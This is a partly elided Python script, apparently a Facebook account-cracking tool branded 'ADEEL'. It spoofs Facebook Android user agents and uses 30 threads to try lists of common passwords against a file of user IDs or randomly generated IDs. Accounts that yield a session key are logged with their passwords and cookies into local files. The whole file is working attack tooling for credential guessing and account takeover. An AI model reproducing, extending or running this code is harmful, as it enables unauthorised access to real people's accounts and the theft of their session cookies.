...
def clr():
    try:
        ...
        if 'Android' in data:
            print(' \033[1;32m[!] DONT TRY AGAIN ITS SIAL ');exit()
        else:exit()
    except:exit()
####### MODULES KILLER #######
...
try:
	...
	os.system('python ADEEL .py')
os.system("clear")
print('\n\033[1;32m JOIN FB GROUP....')
...
def ua_sial():
	...
	END = '[FBAN/FB4A;FBAV/;FBBV/;[FBAN/rFB4A;FBAV/272.0.0.6.129;FBBV/20454115;FBDM/){density=2.0,width=720,height=1280};FBLC/pt_BR;FBCR/axis;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A015M;FBSV/4.0;FBOP/1;nullFBCA/armeabi-v7a:armeabi;]'
...
logo=("""\033[1;37m 
 ...
 /_/    \_\_____/|______|______|______|
====================================================
[â€¢] OWNER      : ADEEL 
[â€¢] GITHUB     : adeeljoon11 
[â€¢] STATUS     : FREE
[â€¢] VERSION    : 0.1
====================================================
[â€¢] ENJOY ALL ðŸ˜Š
...
def ADEEL ():
		...
		if shm =='1':
			os.system("xdg-open https://www.facebook.com/groups/525969528444585/?ref=share&mibextid=NSMWBT/")
			file_crack()
		elif shm =='2':
			os.system("xdg-open https://www.facebook.com/profile.php?id=100081713664316&mibextid=ZbWKwL")
			r_crack()
		elif shm =='3':
			gmail()
			ADEEL ()
			...
			os.system('xdg-open https://youtube.com/@ADEEL_48')
			ADEEL ()
		elif shm =='9':
...
def file_crack():
	...
	with tred(max_workers=30) as ADEEL :
		...
		print("\33[1;37m [+] Your Cp/Ok Id Save In ADEEL Folder")
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd =='1':
				ADEEL .submit(api1,ids,names,passlist)
			else:
				ADEEL .submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def pak():
	...
	with tred(max_workers=30) as ADEEL :
		...
		for psx in user:
			ids = code+psx
			passlist = [psx,ids,'khankhan','khan12','malikmalik','afghan123','Afghan123','Afghan12','baloch786','janjan','kingkhan','khankhan12345','malik786','khanbaba','pak123','۱۲۳۴۵۶','100200','malik1122','khan1122']
			ADEEL .submit(rd1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' [+] The process has completed')
	print(' [+] Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[ ADEEL ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				xxx = '[Dalvik/2.0.0 (Linux; U; Android 11; Samsung Galaxy S21 Build/RP1A.200720.012) [FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/'+str(random.randint(10000000, 99999999))+';FBCR/Samsung;FBMF/Galaxy S21;FBBD/Galaxy S21;FBPN/com.facebook.katana;FBDV/Galaxy S21;FBSV/11;FBOP/1;FBCA/arm64-v8a;]'
				ua  = "[Dalvik/2.0.0 (Linux; U; Android 11; Samsung Galaxy S21 Build/RP1A.200720.012) [FBAN/FB4A;FBAV/{application_version};FBBV/{application_version_code};FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;FBRV/'+str(random.randint(10000000, 99999999))+';FBCR/Samsung;FBMF/Galaxy S21;FBBD/Galaxy S21;FBPN/com.facebook.katana;FBDV/Galaxy S21;FBSV/11;FBOP/1;FBCA/arm64-v8a;]"
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[ADEEL-OK] '+uid+' | '+pas)		                    
						#print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'ADEEL _RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'ADEEL _COOKIES.txt')
					...
					#	print(f'\r\r\33[1m\33[1;35m [ADEEL-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'ADEEL -CP.txt')
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					print('\r\r\033[1;32m [Adeel-OK] '+uid+' | '+pas)
					linex()
					file_path = os.path.join(folder_path, 'ADEEL _FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
